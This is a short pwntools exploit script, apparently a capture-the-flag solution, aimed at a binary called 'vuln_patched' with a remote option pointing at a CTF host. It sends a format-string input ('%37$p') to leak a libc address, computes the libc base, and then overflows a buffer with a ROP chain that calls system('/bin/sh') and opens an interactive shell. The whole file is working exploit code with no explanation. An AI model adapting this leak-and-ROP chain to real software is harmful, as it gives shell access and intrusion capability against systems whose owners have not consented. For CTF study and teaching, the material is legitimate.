#!/usr/bin/env python3

from pwn import *

exe = ELF('vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+60
        b*main+91
        c
        ''')
        input()


if args.REMOTE:
    p = remote('kashictf.iitbhucybersec.in',56864)
else:
    p = process([exe.path])
GDB()

sla(b'What do you want? ',f'%37$p'.encode())

p.recvuntil(b'giving you ')
leak= int(p.recvline(),16)
libc.address = leak - 0x27305
info("Libc leak = "+hex(leak))
info("Libc base = "+hex(libc.address))

ret = libc.address + 0x00000000000f655f
prdi = libc.address + 0x00000000000277e5
prsi = libc.address + 0x0000000000028f99
payload = b'a'*40 + p64(ret)+ p64(prdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
sla(b'Wanna Cry about that? ',payload)

p.interactive()
